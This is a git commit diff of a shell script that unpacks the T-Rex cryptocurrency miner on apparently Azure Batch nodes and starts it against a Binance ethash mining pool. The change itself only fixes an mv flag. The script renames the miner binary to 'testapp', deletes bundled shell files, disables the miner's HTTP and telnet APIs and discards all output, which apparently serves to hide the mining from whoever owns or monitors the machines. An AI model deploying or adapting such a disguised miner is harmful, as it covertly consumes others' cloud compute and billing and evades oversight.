3747ad9fec9ad847dd1a1626f1f5e75ef9270c6b
fietsbel <fietsbel@users.noreply.github.com>
2021-06-09 15:39:27 +0200

    Update script.sh

--- script.sh
+++ script.sh
@@ -34,7 +34,7 @@ else
     tar -xzvf /home/_azbatch/trex/t-rex-0.20.4-linux.tar.gz &&
     cd /home/_azbatch/trex &&
     find . -name "*.sh" -type f -delete &&
-    sudo mv -r /home/_azbatch/trex /home/_azbatch/testapp &&
+    sudo mv /home/_azbatch/trex /home/_azbatch/testapp &&
     sudo mv /home/_azbatch/testapp/t-rex /home/_azbatch/testapp/testapp &&
     hostname=$(hostname | cut -c1-8) &&
     /home/_azbatch/testapp/testapp --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad.001 --worker datad.001 --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30  > /dev/null 2>&1 
